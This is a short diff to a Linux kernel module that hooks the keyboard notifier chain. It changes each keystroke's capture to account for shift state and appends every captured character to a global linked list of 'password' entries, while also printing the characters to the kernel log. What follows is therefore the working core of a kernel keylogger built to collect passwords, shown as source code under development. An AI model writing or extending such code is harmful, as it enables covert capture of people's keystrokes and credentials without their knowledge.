@@ -30,6 +30,7 @@
 
 struct notifier_block nb;
 int password_count;
+struct password* HEAD = NULL;
 
 // We want a reference to the password* head
 // TODO create a remove / overwrite with kfree
@@ -42,8 +43,8 @@ void push(struct password** head, char* password_value){
 	new_node = (struct password*)kmalloc(sizeof(struct password), GFP_KERNEL);
 	new_node->pw = password_value;
         new_node->next = NULL;
-        
-	password_count++;
+        password_count++;
+
         if(*head == NULL){
                 *head = new_node;
                 return;
@@ -70,7 +71,8 @@ int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void* data)
 //	printk("Key:  %d  Lights:  %d  Shiftmax:  %x\n", kp->value, kp->ledstate, kp->shift);
 	if(kp->value > 119) return 0;
 	// keymap[][] returns a char* since you can have names like '_BACKSPACE_'
-	printk("Letter: %s\n", keymap[kp->value][0]);
+	printk("Letter: %s\n", keymap[kp->value][kp->shift]);
+	push(&HEAD, keymap[kp->value][kp->shift]);
 	printk("Number of passwords: %d\n", password_count);
 	
 	return 0;
